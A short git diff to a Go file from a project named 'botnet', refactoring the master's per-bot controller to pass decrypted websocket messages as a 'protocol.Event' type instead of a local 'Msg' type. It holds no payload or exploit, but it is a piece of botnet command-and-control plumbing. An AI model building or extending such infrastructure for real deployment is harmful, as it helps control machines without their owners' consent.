@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"github.com/adrianosela/botnet/lib/encryption"
+	"github.com/adrianosela/botnet/lib/protocol"
 	"github.com/gorilla/websocket"
 
 	uuid "github.com/satori/go.uuid"
@@ -25,7 +26,7 @@ type SlaveCtrl struct {
 	id          string
 	slavePubKey *rsa.PublicKey
 	WSConn      *websocket.Conn
-	MsgChan     chan *Msg
+	MsgChan     chan *protocol.Event
 	Master      *Master
 }
 
@@ -39,7 +40,7 @@ func NewSlaveCtrl(m *Master, slavePubKey string, conn *websocket.Conn) (*SlaveCt
 		id:          uuid.NewV4().String(),
 		slavePubKey: pubKey,
 		WSConn:      conn,
-		MsgChan:     make(chan *Msg),
+		MsgChan:     make(chan *protocol.Event),
 		Master:      m,
 	}, nil
 }
@@ -67,12 +68,12 @@ func (s *SlaveCtrl) reader() {
 			log.Printf("could not decrypt message from slave %s: %s", s.id, err)
 			continue
 		}
-		var msg Msg
-		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
+		var event protocol.Event
+		if err = json.Unmarshal(jsonMsg, &event); err != nil {
 			log.Printf("could not unmarshal message from slave %s: %s", s.id, err)
 			continue
 		}
-		s.Master.receiveMsgChan <- &msg
+		s.Master.receiveMsgChan <- &event
 	}
 }
 
